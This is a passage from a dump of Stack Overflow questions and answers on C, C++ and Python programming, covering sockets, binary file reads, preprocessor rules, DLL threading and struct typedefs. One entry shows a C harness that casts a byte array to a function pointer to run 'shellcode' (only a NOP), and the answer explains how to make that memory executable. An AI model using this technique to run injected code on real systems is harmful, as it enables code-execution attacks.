s.connect((TCP_IP, TCP_PORT))

while True:
    s.send(bytes('hello', 'UTF-8'))
    time.sleep(1)

s.close()
</code></pre>

<p>How can I detect, if I lost the connection to the server, and how can I safely reconnect then?</p>

<p>Is it necessary to wait for answer to the server?</p>

<p>UPDATE:</p>

<pre><code>import socket
import time

TCP_IP = '127.0.0.1'
TCP_PORT = 81
BUFFER_SIZE = 1024

def reconnect():
    toBreak = False
    while True:
        s.close()
        try:
            s.connect((TCP_IP, TCP_PORT))
            toBreak = True
        except:
            print (""except"")        
        if toBreak:
            break
        time.sleep(1)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

while True:
    try:    
        s.send(bytes('hello', 'UTF-8'))
        print (""sent hello"")
    except socket.error as e:
        reconnect()

    time.sleep(1)

s.close()
</code></pre>

<p>If I break the connection, it raises an error (does not really matter what), and goes to the
reconnect loop. But after I restore the connection, the connect gives back this error:</p>

<p>OSError: [WinError 10038] An operation was attempted on something that is not a socket</p>

<p>If I restart the script, which calls the same s.connect((TCP_IP, TCP_PORT)), it works fine.</p>
","9530","","<p>You'll get a <a href=""http://docs.python.org/2/library/socket.html#socket.error"" rel=""nofollow""><code>socket.error</code></a>:<code>[Errno 104] Connection reset by peer</code> exception (aka <code>ECONNRESET</code>) on any call to <code>send()</code> or <code>recv()</code> if the connection has been lost or disconnected.  So to detect that, just catch that exception:</p>

<pre><code>while True:
    try:
        s.send(bytes('hello', 'UTF-8'))
    except socket.error, e:
        if e.errno == errno.ECONNRESET:
            # Handle disconnection -- close &amp; reopen socket etc.
        else:
            # Other error, re-raise
            raise
    time.sleep(1)
</code></pre>
"
"<p>I wrote a simple ASM file and ran it in a C file I'd written. I got a segentation fault. However, when I execute the compiled ASM file, I get no error.</p>

<p>I am running 64 bit and using 32 bit shellcode. Is that the issue?</p>

<p>It can't be, because I'm getting a segmentation fault with this:</p>

<pre><code>char shellcode[] = ""\x90""; //simple NOP in ASM
int main(int argc, char **argv)
{
  int (*ret)();
  ret = (int (*)()) shellcode;
  (int)(*ret)();
}
</code></pre>

<p>Can someone please run this and tell me whether or not they get a segmentation fault. I have used 3 or 4 other C files as well. None have worked.</p>

<p><strong>Update:</strong></p>

<pre><code>((void(*)(void))code)();
</code></pre>

<p>Seems to be working in place of those three lines.</p>
","9530","","<p>Two issues:</p>

<ol>
<li>The shell code might be in non-executable memory.  In order to make it executable, you need to either ask the OS to make it executable (e.g. with <a href=""http://linux.die.net/man/2/mprotect"" rel=""nofollow""><code>mprotect(2)</code></a> or <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa366898%28v=vs.85%29.aspx"" rel=""nofollow""><code>VirtualProtect()</code></a>), or allocate new executable memory and copy it there (e.g. with <a href=""http://linux.die.net/man/2/mmap"" rel=""nofollow""><code>mmap(2)</code></a> or <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa366887%28v=vs.85%29.aspx"" rel=""nofollow""><code>VirtualAlloc()</code></a>.</li>
<li>Your shell code doesn't return/exit.  After the CPU executes your NOP there (0x90), it's going to keep on executing code in the memory that comes after that NOP instruction.  Most likely, this will crash quickly, but it might do other random, unpredictable things.</li>
</ol>

<p>To fix #2, you need to explicitly either execute a return instruction (<code>C3</code> on x86/x86-64) to return from your shell code, or you need to do something which never returns, like call the <a href=""http://linux.die.net/man/3/exit"" rel=""nofollow""><code>exit(3)</code></a> function.</p>
"
"<pre><code>typedef struct {
  char c[20];
  int i;
} header;

void foo(std::string s) {
  std::ifstream ifs(s.c_str(), std::ios_base::binary | std::ios_base::in);
  if (ifs) {
    std::filebuf* pbuf = ifs.rdbuf();
    pbuf-&gt;pubseekpos(std::ios_base::beg); 
    // ... ?
  }
}
</code></pre>

<p>I'm trying to read a file in binary mode the C++ way, I can't identify the right method to call for reading the bits from the file, there is a <code>read</code> for <code>ifstream</code> but if I'm supposed to use that method, what is the point of <code>filebuf</code> ?</p>

<p>To simplify things I have a <code>struct</code> that represents the order, the size and the fields of the header and I hope that there will be a method that would just keep and instance of this struct and write the bits in right fields just like <code>fread</code> from C.</p>

<p>Someone can clarify the point of <code>filebuf</code> and what method should I use when reading a file through an unformatted stream of data ?</p>
","9530","","<p>Just use <a href=""http://en.cppreference.com/w/cpp/io/basic_istream/read"" rel=""nofollow""><code>basic_istream&lt;&gt;::read()</code></a> to read raw, unformatted byte data:</p>

<pre><code>void foo(std::string s) {
  std::ifstream ifs(s.c_str(), std::ios_base::binary | std::ios_base::in);
  if (ifs) {
    char buffer[20];
    if (!ifs.read(buffer, 20)) {
      // Handle error
    }
  }
}
</code></pre>
"
"<p>I am using <code>shutil.rmtree</code> to remove a directory, but other processes (that I don't control) that create files in that tree are failing to create the files because the directories don't exist. Is there something as easy as <code>shutil.rmtree</code> that only deletes files but preserves directory structure?</p>
","9530","","<p>I don't think there's a built-in function to do this, but you could easily do it yourself using <a href=""http://docs.python.org/2/library/os.html#os.walk"" rel=""nofollow""><code>os.walk()</code></a>:</p>

<pre><code>for dirpath, dirnames, filenames in os.walk(my_directory):
    # Remove regular files, ignore directories
    for filename in filenames:
        os.unlink(os.path.join(dirpath, filename))
</code></pre>
"
"<p>I'am writing a program with a few files, let's assume that all includes are ok. Here is shortened code.
ZZ.hpp:</p>

<pre><code>class ZZ
{
    public:
        ZZ(ZZ const &amp; a) { mpz_init_set(data, a.data); }
        ZZ(int a = 0) { mpz_init_set_si(data, a); }
.
.
.
</code></pre>

<p>ZZmodN.hpp:</p>

<pre><code>template &lt;unsigned ID&gt;
class ZZmodN
{
    public:
    ZZmodN() = default;
    ZZmodN(ZZmodN const &amp;) = default;
    template &lt;typename T&gt;
    ZZmodN(T const &amp; a) : value(a) { value %= modulus; }
.
.
.    
    private:
    ZZ value;
    static ZZ modulus;
};
template &lt;unsigned ID&gt;
ZZ ZZmodN&lt;ID&gt;::modulus(19);
.
.
.
</code></pre>

<p>Polynomial.h:</p>

<pre><code>class Polynomial{
    public:
    std::vector&lt;ZZmodN&lt;0&gt; &gt; co;
    Polynomial(){};
    Polynomial(ZZmodN&lt;0&gt; a){
        co.push_back(a);
    }
.
.
</code></pre>

<p>and finally Field.h:</p>

<pre><code>#include ""Polynomial.h""
class Field{
    public:
    static Polynomial f;
    Polynomial poly;
    Field(){}
.
.
};
Polynomial Field::f = Polynomial(1);  
</code></pre>

<p>the problem is: I'm receiving Floating point exception when I call last (<em>*</em>) line, because 'modulus' = 0 when value %= modulus; is called. Why is it 0 and not 19? I checked, and ZZ constructor with 19 is called.
Please help.</p>
","9530","","<p>The problem you're running into is the <a href=""http://www.parashift.com/c++-faq/static-init-order.html"">static initialization order fiasco</a>.  In your case, the linker is deciding to initialize <code>Field::f</code> before it initializes <code>ZZmodN&lt;0&gt;::modulus</code>.</p>
"
"<p>I'm sending a single grayscale frame (160x120) from LabVIEW to this C-program through TCP. I managed to convert the bytes to uint32 pixel values. The goal here is that I will define every 19203  bytes as an image array where the first byte is a header which defines the ID of the array, the second and third bytes defines the resolution (120 and 160) and the last 19200 bytes are the received bytes from the LabVIEW program. The purpose is that the first byte of the first array will get the value ""1"", and the first byte of the second array will get the value ""2"" and so on. </p>

<p>The problem in this case occurs when I examine the 19203 bytes. I can clearly see that every uint32 value seems correct until value 4801. From that value and up to 19203, I get a constant weird value: ""3435973836"", that has nothing to do with the grayscale pixels, since it can only between 0 and 300. Where does the error occur ?.</p>

<p><img src=""http://i.stack.imgur.com/i7uCW.png"" alt=""Result""> </p>

<pre><code>#define DEFAULT_BUFLEN 19203

int main(int argc , char *argv[])
{
    WSADATA wsa;
    SOCKET s , new_socket;
    struct sockaddr_in server , client;
    int c;
    int iResult;
    int receivedCount = 0;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    typedef unsigned int uint8_t;
    unsigned long totalReceived = 0, totalExpected=160*120;
    unsigned int i;
    uint32_t image[DEFAULT_BUFLEN]; 
    size_t len;
    uint8_t* p;
    uint8_t value;
    int x=0;
    int z=0;

    p = (uint8_t*)recvbuf;

    do
    {
        iResult = recv( new_socket, recvbuf, recvbuflen, 0);
        for(z=1; z&lt;11; z++)
        {
            image[0] = z;

            for(i=0, x=1; i&lt;19202,x&lt;19203; i++, x++)
            {
                image [x] = p[i];
                printf(""%lu\n"",image[x]);
            }
        }   
    }
    while(iResult &gt; 0 );

    closesocket(new_socket);
    WSACleanup();

    return 0;
}
</code></pre>
","9530","","<p><code>recv()</code> may not necessarily read all of the bytes you ask it to -- it's likely returning fewer bytes than you asked for.  You need to always check the return value of <code>recv()</code> and only process that many bytes.  By ignoring the return value, you're reading uninitialized memory.</p>

<p>The number 3435973836 is much more elucidating in hexadecimal -- it's 0xcccccccc.  This <a href=""http://en.wikipedia.org/wiki/Magic_number_%28programming%29#Magic_debug_values"" rel=""nofollow"">magic number</a> is used by the Visual Studio runtime to initialize stack memory in Debug builds, so when you see that value, you know you're reading uninitialized stack memory.</p>
"
"<p>My question is academic.  Can anyone tell me why several least sig bits are changed if I try a shortcut and use <code>GetSystemTimeAsFileTime()</code> directly with a call using a <code>__int64</code> param ?</p>

<pre><code>FILETIME fileTimeUTC;
__int64  timeUTC_64;
__int64  timeUTC_64Test;

GetSystemTimeAsFileTime(&amp;fileTimeUTC);    
memcpy(&amp;timeUTC_64, &amp;fileTimeUTC, sizeof(__int64 ));
GetSystemTimeAsFileTime((FILETIME*)&amp;timeUTC_64Test);
ATLASSERT(sizeof(__int64) == sizeof(FILETIME)); // okay
ATLASSERT(timeUTC_64 == timeUTC_64Test); // FAILS !
</code></pre>
","9530","","<p>You're seeing a small difference in the low-order bits simply because the system time advances a small amount (probably on the order of several microseconds) in between the two calls.  It takes a non-infinitesimal amount of time just to get the current system time.</p>

<p>Also, as the documentation for the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms724284%28v=vs.85%29.aspx""><code>FILETIME</code> structure</a> notes, you should <em>not</em> be doing any casting here with <code>FILETIME</code> instances:</p>

<blockquote>
  <p>Do not cast a pointer to a <code>FILETIME</code> structure to either a <code>ULARGE_INTEGER*</code> or <code>__int64*</code> value because it can cause alignment faults on 64-bit Windows.</p>
</blockquote>

<p>Just use a <code>FILETIME</code> instance and convert it manually to a 64-bit value if you need to do math on it in order to avoid the possibility of alignment faults on 64-bit windows.</p>
"
"<p>I am bench-marking the execution time of solving matrices , and i cant get more then ~200x200, i should go probably 1500x1500 or close to that. I am running this on VS . </p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include ""lapacke.h""
#include ""lapacke_config.h""
#include &lt;time.h&gt;

/* Auxiliary routines prototypes */
extern void print_matrix(lapack_complex_double *a, int m, int n);
extern void generate_matrix(lapack_complex_double * matrix, int w, int h);

/* Parameters */
#define N 179

/* Main program */
int main() {
    clock_t t;
    /* Locals */
    lapack_int n = N,info;
    lapack_int ipiv[N];
    lapack_complex_double a[N*N];
    lapack_complex_double b[N*N];

    FILE* fp1 = fopen(""complexNumsLog.txt"", ""w"");

    int w = 1, h = 1, h2 = 1, i = 0, j = 0; 


    for(i = 1; i &lt;= N; i++){
        for(j = 1; j &lt;= N; j++){
            w = i;
            h = i;
            h2 = j;

            generate_matrix(a, w, h);
            generate_matrix(b, w, h2);

            // print_matrix(a, w, h);
            // print_matrix(b, w, h2);

            // getchar(); 


            t = clock();
            info = LAPACKE_zgesv(LAPACK_ROW_MAJOR, w, h2, a, h, ipiv, b, h2);
            t = clock() - t;

            fprintf(fp1, ""Matrix A: %3dx%3d "", w, h);
            fprintf(fp1, ""Matrix B: %3dx%3d "", w, h2);
            fprintf(fp1, ""%3d milliseconds %2.3f seconds\n"",t,((float)t)/CLOCKS_PER_SEC);

            /* Check for the exact singularity */
            if( info &gt; 0 ) {
                printf( ""The diagonal element of the triangular factor of A,\n"" );
                printf( ""U(%i,%i) is zero, so that A is singular;\n"", info, info );
                printf( ""the solution could not be computed.\n"" );
                getchar();
                exit( 1 );
            }
        }
        printf(""%d\n"", i);
    }
    getchar();
    exit( 0 );
} 

void print_matrix(lapack_complex_double* a, int m, int n) {
    int i, j;
    for( i = 0; i &lt; m; i++ ) {
        for( j = 0; j &lt; n; j++ )
            printf( "" (%6.2f,%6.2f)"", a[i*m+j].real, a[i*m+j].imag );
        printf( ""\n"" );
    }
    printf( ""********************************************\n"" );
}



void generate_matrix(lapack_complex_double * matrix, int w, int h){
    int i,j;
    double r;
    for(i = 0; i &lt; w; i++){
        for(j = 0; j &lt; h; j++){
            r = (rand()%1000 - 500)/100.0;
            matrix[i*w+j].real = r;
            r = (rand()%1000 - 500)/100.0;
            matrix[i*w+j].imag = r;;
        }
    }
}
</code></pre>
","9530","","<p>You're blowing your stack.  Your program is typically only allocated a few MB of stack space, and you're trying to allocate all of your data on the stack.  When you get above about 200x200, you very quickly run out of stack space.</p>

<p>To fix this, you need to either allocate the memory at global scope or on the heap, where the size is only limited by your virtual address space and/or total available physical memory.  Since the size is known at compile time, it's easiest to allocate it at global scope:</p>

<pre><code>/* Parameters */
#define N 179
lapack_int ipiv[N];
lapack_complex_double a[N*N];
lapack_complex_double b[N*N];    

/* Main program */
int main() {
    ...
}
</code></pre>
"
"<p>I wanted to check if a fraction 2 4 (for example) can be simplified to 1 2!!
<br/>However logical condition fails</p>

<pre><code>#include &lt;stdio.h&gt;
int main()
{
  int a,b,live=1;
  printf(""\n\nInput integers for fraction:"");
  scanf("" %d%d"",&amp;a,&amp;b);
  while(live){  
        if(!(a%2 &amp;&amp; b%2)){
            a/=2;
            b/=2;
        }else if(!(a%3 &amp;&amp; b%3)){
            a/=3;
            b/=3;
        }else if(!(a%5 &amp;&amp; b%5)){
            a/=5;
            b/=5;
        }else if(!(a%7 &amp;&amp; b%7)){
            a/=7;
            b/=7;
        }else live--;

   }
   printf(""Simplified Fraction is %d/%d"",a,b);
} 
</code></pre>
","9530","","<p>The condition <code>a%2</code> is equivalent to <code>a%2 != 0</code>, i.e. it tests if <code>a</code> is <em>not</em> divisible by 2.  From <a href=""http://en.wikipedia.org/wiki/De_Morgan%27s_Laws"" rel=""nofollow"">De Morgan's Laws</a>, the condition <code>if(!(a%2 &amp;&amp; b%2))</code> is equivalent to <code>if(!(a%2) || !(b%2))</code> or <code>if((a%2 == 0) || (b%2 == 0))</code>, which is not what you want.</p>

<p>You really want to test <code>if((a%2 == 0) &amp;&amp; (b%2 == 0))</code> -- that is, if <em>both</em> are divisible by 2, not if <em>either</em> is divisible by 2.  Writing it this way is also much less confusing.</p>

<p>And it should also be obvious that in order to simplify any fraction, you need to test for all possible prime factors, which is impossible to do with a finite number of <code>if</code> statements.  The recommended way of doing this is to use the <a href=""http://en.wikipedia.org/wiki/Euclidean_algorithm"" rel=""nofollow"">Euclidean algorithm</a> to determined the greatest common divisor of the numerator and denominator, and then you divide both by the GCD to get the fraction in reduced form.</p>
"
"<p>I have a bunch of data that looks like this:</p>

<blockquote>
  <p>{""Game"":""Chess"",""title"":""just for
  fun!"",""size"":""2"",""entriesData"":[""PLAYERNAME"",""IMAGEHERE""],""entryFee"":1,""prizeSummary"",""gameId"":""9436"",""tableSpecId"":""1079"",""dateUpdated"":1389810809648,""dateCreated"":1389659697294,""stack"":235,""entryHTML"":null}</p>
</blockquote>

<p>with basically a bunch of entries one after another.</p>

<p>I want to parse this data to get playername, game type, etc.</p>

<p>I know I should use the JSON library to accomplish this.</p>

<p>The page I get the code from has a bunch of HTML on it as well. Is it okay to use the json.load on the html, or should I strip that from it first?</p>

<p>I'm not really entirely sure where to begin solving this problem, and am a bit confused by the JSON documentation.</p>

<p>Any tips or hints would be greatly appreciated.</p>
","9530","","<p>Use the <a href=""http://docs.python.org/2/library/json.html#json.loads"" rel=""nofollow""><code>json.loads()</code></a> function to parse a JSON string into a dictionary or array object.  For example:</p>

<pre><code>&gt;&gt;&gt; import json
&gt;&gt;&gt; x = json.loads('{""Game"":""Chess"",""title"":""just for fun!"",""size"":""2"",""entriesData"":[""PLAYERNAME"",""IMAGEHERE""],""entryFee"":1,""prizeSummary"":"""",""gameId"":""9436"",""tableSpecId"":""1079"",""dateUpdated"":1389810809648,""dateCreated"":1389659697294,""stack"":235,""entryHTML"":null}')
&gt;&gt;&gt; print x
{u'entryHTML': None, u'entriesData': [u'PLAYERNAME', u'IMAGEHERE'], u'prizeSummary': u'', u'title': u'just for fun!', u'dateCreated': 1389659697294L, u'Game': u'Chess', u'gameId': u'9436', u'entryFee': 1, u'tableSpecId': u'1079', u'dateUpdated': 1389810809648L, u'stack': 235, u'size': u'2'}
&gt;&gt;&gt; print x['Game']
Chess
</code></pre>
"
"<p>On windows, the programmer could do something like: <code>system(""ls &gt; outputFile.txt"")</code></p>

<p>Is there a platform independent way to access the command line, or a least a way to determine which platform the program is being executed on (because calls for the same functionality vary quite a bit)? </p>

<p><img src=""http://i.stack.imgur.com/E3b6H.png"" alt=""enter image description here""></p>
","9530","","<p>The <a href=""http://linux.die.net/man/3/system"" rel=""nofollow""><code>system(3)</code></a> function is standard ANSI C, it's already platform-independent.  Any conforming C implementation will allow you to call it to run the system default command line processor/shell application.  Of course, the actual programs you can run will vary from system to system (e.g. <code>dir</code> only works on Windows, while <code>ls</code> usually works on Unix-like platforms).</p>
"
"<p>When Share via Intent Text not Shown in Facebook</p>

<pre><code>Intent sendIntent = new Intent();
            sendIntent.setAction(Intent.ACTION_SEND);
            sendIntent.putExtra(android.content.Intent.EXTRA_TEXT, ""HELOO WORLD"");
            sendIntent.setType(""text/plain"");
            startActivity(Intent.createChooser(sendIntent, ""Share with""));;
</code></pre>
","9530","","<p>This is as designed, according to Facebook.  From <a href=""https://developers.facebook.com/x/bugs/332619626816423/"">this Facebook developers bug report</a> (Facebook login required to view):</p>

<blockquote>
  <p>Jesse Chen ·  · Software Engineer at Facebook<br>
  Hi Facebook Developers,</p>
  
  <p>This issue is going to be closed by design because our API does not support pre-filling the message for users as seen in our Policy Documentation here (<a href=""https://developers.facebook.com/docs/guides/policy/application_integration_points/"">https://developers.facebook.com/docs/guides/policy/application_integration_points/</a>) under Platform Policy IV.2.</p>
  
  <p>August 13, 2012</p>
</blockquote>

<p>Note: The link provided above is broken; the current link for Facebook's Platform Policy is here: <a href=""https://developers.facebook.com/policy/#integration"">https://developers.facebook.com/policy/#integration</a> (emphasis added):</p>

<blockquote>
  <p>IV. Application Integration Points</p>
  
  <ol>
  <li>[...]</li>
  <li><strong>You must not pre-fill any of the fields associated with the following products, unless the user manually generated the content earlier in the workflow</strong>: Stream stories (user_message parameter for Facebook.streamPublish and FB.Connect.streamPublish, and message parameter for stream.publish), Photos (caption), Videos (description), Notes (title and content), Links (comment), and Jabber/XMPP.</li>
  </ol>
</blockquote>

<p>So the Facebook app is just enforcing this—if you try to share something with pre-filled in text, Facebook doesn't know if it was written by the user or filled in by the app, so it makes no assumptions, ignores that text, and requires the user to write the text.</p>
"
"<p>Consider the following code <a href=""http://coliru.stacked-crooked.com/a/7924734a01cc9956"" rel=""nofollow""><strong>(live example)</strong></a>:</p>

<pre><code>#define TEST_VA(mX, ...) TEST
#define STRINGIFY_IMPL(mX) #mX
#define STRINGIFY(mX) STRINGIFY_IMPL(mX)

#include &lt;iostream&gt;

int main()
{
    std::cout &lt;&lt; STRINGIFY(TEST_VA(1)) &lt;&lt; std::endl;
    std::cout &lt;&lt; STRINGIFY(TEST_VA()) &lt;&lt; std::endl;
    return 0;
}
</code></pre>

<hr>

<p><strong>clang++ 3.4</strong> complains:</p>

<pre><code>main.cpp:9:37: warning: must specify at least one argument for '...' parameter of variadic macro [-Wgnu-zero-variadic-macro-arguments]
    std::cout &lt;&lt; STRINGIFY(TEST_VA(1)) &lt;&lt; std::endl;
                                    ^
main.cpp:1:9: note: macro 'TEST_VA' defined here
#define TEST_VA(mX, ...) TEST
        ^
main.cpp:10:33: warning: must specify at least one argument for '...' parameter of variadic macro [-Wgnu-zero-variadic-macro-arguments]
        std::cout &lt;&lt; STRINGIFY(TEST_VA()) &lt;&lt; std::endl;
                                       ^
main.cpp:1:9: note: macro 'TEST_VA' defined here
#define TEST_VA(mX, ...) TEST
</code></pre>

<hr>

<p>I use some variadic macros like in the example code in my projects. </p>

<p>Is it safe to pass no arguments for the <code>...</code> parameter of variadic macros? (Ignoring the warning, basically) </p>

<p>Or could it lead to problems? </p>

<p>Is it explicitly forbidden by the standard?</p>
","9530","","<p>It's technically forbidden by the standard.  From C++11 §16.3/4 (emphasis added):</p>

<blockquote>
  <p>If the identifier-list in the macro definition does not end with an ellipsis, the number of arguments (including
  those arguments consisting of no preprocessing tokens) in an invocation of a function-like macro shall equal
  the number of parameters in the macro definition. <strong>Otherwise, there shall be more arguments in the invocation than there are parameters in the macro definition (excluding the <code>...</code>)</strong>.  There shall exist a <code>)</code> preprocessing
  token that terminates the invocation.</p>
</blockquote>

<p>Some compilers may allow this as an extension, but if you want standards-compliant code, you should make sure to always include at least one argument for the ellipsis parameter of a variadic macro.</p>
"
"<p>I have an application that relies on .dlls to extend functionality (modules).
I would like to embed some specific functionality from another program (which is a server).</p>

<p>The other program has a relatively simple <code>n-main.cpp</code></p>

<pre><code>#include &lt;n.h&gt;

int main(int argc, char * argv[])
{
     // creates a listen server and blocks the main thread
     // until it receives SIGKILL/SIGTERM or a custom HTTP header to stop 
     n::start(argc,argv); 
}
</code></pre>

<p>So I did this:</p>

<pre><code>#include &lt;modulespecs.h&gt;
#include &lt;mymodule.h&gt; // only some general specs
#include &lt;n.h&gt; // copied from n-main.cpp, no errors

// The main program calls this function to attach the module
void onModuleAttached(){

     // create some fake arguments
     int argc = 2;
     char * argv[] = {""n.exe"",""someconfig.js""}; 

     // and act as if 
     n::start(argc,argv);
}
</code></pre>

<p>This works perfect so far, the server is created, waits for incoming connections, and answers requests properly.</p>

<p>The only problem is that when the module is loaded, the server blocks the main application, so the main app doesn't continue running because it waits for the server in my module to end activity first (which doesn't happen). And even if it did, the server has logic to close the main application completely when dying. </p>

<p>Things I tried:</p>

<pre><code>  #include &lt;thread&gt;

  void create_server(){
      int argc = 2;
      char * argv[] = {""n.exe"",""someconfig.js""}; 

      // and act as if 
      n::start(argc,argv);
  }
  void onModuleAttached(){

      // crashes
      std::thread test(create_server); 

      // creates the server, then exits immediately
      std::thread (create_server).join();

      // same as join()
      std::thread (create_server).detach();
  }
</code></pre>

<p>Is there a specific way to achieve this? </p>
","9530","","<p>I'm guessing that you're calling <code>onModuleLoaded()</code> from your <code>DllMain()</code> function.  <code>DllMain()</code> gets called while the OS loader lock is held, and so you should <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2004/01/28/63880.aspx"" rel=""nofollow"">never do anything scary inside <code>DllMain()</code></a>.  Creating threads is one such scary thing, so you should never do that inside <code>DllMain()</code>.</p>

<p>The recommended way of avoiding this is to have a separate DLL entry point which does the scary stuff, and <strong>document</strong> your DLL such that that entry point must be called after DLL initialization.  Also provide a corresponding exit routine to be called before unloading the DLL.</p>

<p>For example:</p>

<pre><code>DLLEXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    // Nothing much here
}

std::thread server_thread;

DLLEXPORT void StartServer()
{
    server_thread = std::thread(create_server);
}

DLLEXPORT void StopServer()
{
    server_thread.join();
}
</code></pre>

<p>Then your main program can look like this:</p>

<pre><code>// Load the DLL and get its entry and exit routines
HMODULE serverDLL = LoadLibrary(...);
void (*StartServer)() = (void (*)())GetProcAddress(serverDLL, ""StartServer"");
void (*StopServer)() = (void (*)())GetProcAddress(serverDLL, ""StopServer"");

// Call the entry routine to start the server on a new thread
StartServer();

// Do other main program stuff
// ...

// We're done now, tell the server to stop
StopServer();
FreeLibrary(serverDLL);
</code></pre>
"
"<p>I have a chained hash table with the following structure:</p>

<pre><code>typedef struct{
    char* phrase; 
    struct phrase_struct* next; 
}phrase_struct;
</code></pre>

<p>My immediate concern about this structure was that the pointer actually referred to a typedef that may not have been defined yet .. but it compiled so I figured it was valid syntax. I have several functions that either allocate memory and manipulate the pointer <code>next</code> that points to the next node. </p>

<p>Consider pointers of the following type and an automatically allocated struct:</p>

<p><code>phrase_struct* ptr1</code> </p>

<p><code>phrase_struct* ptr2</code></p>

<p><code>phrase_struct test_s;</code></p>

<p>If I did the following assignments: </p>

<p><code>ptr1 = &amp;test_s</code></p>

<p><code>ptr2 = test_s.next;</code> &lt;- this pointer would be set to NULL elsewhere in the code </p>

<p>I would continually get error complaining about incompatible assignments of the type:</p>

<p><code>'=' : incompatible types - from 'phrase_struct *' to 'phrase_struct *'</code></p>

<p>And then it hit me .. I recalled having previously read something regarding namespaces of typedef and actual structure names being independent. </p>

<hr>

<pre><code>typedef struct test{
    char* phrase; 
    struct test* next; 
}phrase_struct;
</code></pre>

<p>Changing the structure definition to this fixed all the warnings. </p>

<p>Can someone explain this? </p>
","9530","","<p>This definition</p>

<pre><code>typedef struct{                 // 1
    char* phrase; 
    struct phrase_struct* next; // 2
}phrase_struct;                 // 3
</code></pre>

<p>defines 3 things:</p>

<ol>
<li>An <em>anonymous</em> structure</li>
<li>A member which is a pointer to a <em>forward-declared structure</em> named <code>struct phrase_struct</code></li>
<li>A <code>typedef</code> for the anonymous structure called <code>phrase_struct</code></li>
</ol>

<p>Whenever you refer to a plain <code>phrase_struct</code>, it refers to the <code>typedef</code>.  Whenever you refer to <code>struct typedef</code>, it refers to the structure named <code>phrase_struct</code> within the <code>struct</code> tag namespace; this structure has been forward-declared (in (2)) and is an incomplete type, but it hasn't actually been fully defined yet.</p>

<p>The error message is unfortunately confusing.  What the error is trying to say is this:</p>

<pre><code>'=' : incompatible types - from 'struct phrase_struct *' to the typedef
      'phrase_struct *'
</code></pre>

<p>because the undefined, forward-declared structure has no relation to the <code>typedef</code> which has been defined.</p>

<p>The fix, as you found, is straightforward: instead of defining an <em>anonymous</em> structure, give the structure a name, and refer to that same name (in the <code>struct</code> tag namespace) in the member definition:</p>

<pre><code>typedef struct phrase_struct{   // 1
    char* phrase;
    struct phrase_struct* next; // 2
}phrase_struct;                 // 3
</code></pre>

<p>This defines:</p>

<ol>
<li>A structure named <code>struct phrase_struct</code> in the <code>struct</code> tag namespace</li>
<li>A member with a type of pointer to a <code>struct phrase_struct</code> instance (i.e. the type defined in (1))</li>
<li>A <code>typedef</code> named <code>phrase_struct</code>, defined as an alias for <code>struct phrase_struct</code></li>
</ol>

<p>It's confusing because the tag namespaces (<code>struct</code>, <code>union</code>, and <code>enum</code>) are separate from the ordinary <code>typedef</code> namespace.</p>

<p>See also <a href=""http://stackoverflow.com/questions/612328/difference-between-struct-and-typedef-struct-in-c"">Difference between <code>struct</code> and <code>typedef struct</code> in C++?</a> and <a href=""http://stackoverflow.com/questions/707512/what-is-a-typedef-enum-in-objective-c"">What is a <code>typedef enum</code> in Objective-C?</a>.</p>
"
"<p>Given the C file below:</p>

<pre><code>$ cat macros.c
#ifdef MACRO
#  error MACRO is defined
#else
#  error MACRO is undefined
#endif
#if MACRO
#  error MACRO is non-zero
#else
#  error MACRO is zero
#endif
</code></pre>

<p>What is the expected output of the following?</p>

<pre><code>$ gcc           -c macros.c
$ gcc -DMACRO   -c macros.c
$ gcc -DMACRO=0 -c macros.c
</code></pre>

<p><strong>Answer</strong>: Here's what the gcc's preprocessor on my machine does.</p>

<pre><code>$ gcc           -c macros.c
macros.c:4:4: error: #error MACRO is undefined
macros.c:9:4: error: #error MACRO is zero
$ gcc -DMACRO   -c macros.c
macros.c:2:4: error: #error MACRO is defined
macros.c:7:4: error: #error MACRO is non-zero
$ gcc -DMACRO=0 -c macros.c
macros.c:2:4: error: #error MACRO is defined
macros.c:9:4: error: #error MACRO is zero
$
</code></pre>

<p><strong>Lesson</strong>: <code>#ifdef MACRO</code> evaluates to true for defined-ness <em>even if the defined value is 0 (zero)</em>.</p>

<p>Another C preprocessor gotcha! Is this how it should be as per the C standard?</p>
","9530","","<p>Any undefined macro is treated as it were defined as 0 for the purposes of evaluating the controlling expressions of <code>#if</code> statements.  From C99 §6.10.1/3-4 (emphasis added):</p>

<blockquote>
  <p>3) Preprocessing directives of the forms  </p>
  
  <p><code># if constant-expression new-line group</code><sub><code>opt</code></sub><br>
  <code># elif constant-expression new-line group</code><sub><code>opt</code></sub>  </p>
  
  <p>check whether the controlling constant expression evaluates to nonzero.</p>
  
  <p>4) Prior to evaluation, macro invocations in the list of preprocessing tokens that will become
  the controlling constant expression are replaced (except for those macro names modified
  by the <code>defined</code> unary operator), just as in normal text. If the token <code>defined</code> is
  generated as a result of this replacement process or use of the <code>defined</code> unary operator
  does not match one of the two specified forms prior to macro replacement, the behavior is
  undefined. <strong>After all replacements due to macro expansion and the <code>defined</code> unary
  operator have been performed, all remaining identifiers (including those lexically
  identical to keywords) are replaced with the pp-number 0</strong>, and then each preprocessing
  token is converted into a token. [...]</p>
</blockquote>

<p>So, for example, expressions like this:</p>

<pre><code>#if !FOO
</code></pre>

<p>Will evaluate to <code>1</code> if <code>FOO</code> is undefined, since it will be treated as a 0, and then <code>!FOO</code> would be evaluated as <code>!0</code>, which is <code>1</code>.</p>
"
"<p>I have a dll with some functions.
Header exemple:</p>

<pre><code>__declspec(dllexport) bool Test()
</code></pre>

<p>;
And i have another simple application to use that function:</p>

<pre><code>typedef bool(CALLBACK* LPFNDLLFUNC1)();

HINSTANCE hDLL;               // Handle to DLL
LPFNDLLFUNC1 lpfnDllFunc1;    // Function pointer
bool uReturnVal;

hDLL = LoadLibrary(L""NAME.dll"");
if (hDLL != NULL)
{
    lpfnDllFunc1 = (LPFNDLLFUNC1)GetProcAddress(hDLL,""Test"");
    if (!lpfnDllFunc1)
    {
        // handle the error
        FreeLibrary(hDLL);
        cout &lt;&lt; ""error"";
    }
    else
